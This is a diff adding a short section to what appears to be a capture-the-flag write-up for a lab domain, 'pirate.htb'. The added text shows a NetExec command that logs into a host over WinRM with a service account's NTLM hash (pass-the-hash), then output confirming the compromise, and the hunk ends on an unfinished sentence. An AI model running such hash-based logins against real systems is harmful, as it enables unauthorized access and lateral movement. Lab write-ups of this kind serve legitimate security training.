@@ -389,7 +389,13 @@ PORT      STATE SERVICE      REASON
 
 These are the open ports
 
+```python
+nxc winrm web01.pirate.htb -u 'gMSA_ADFS_prod$' -H 'e819498ec29f595382df1eaf4fb42307'
+WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb) 
+WINRM       192.168.100.2   5985   WEB01            [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)
+```
 
+The ADFS service account can be used to winrm into the ``
 
 
 
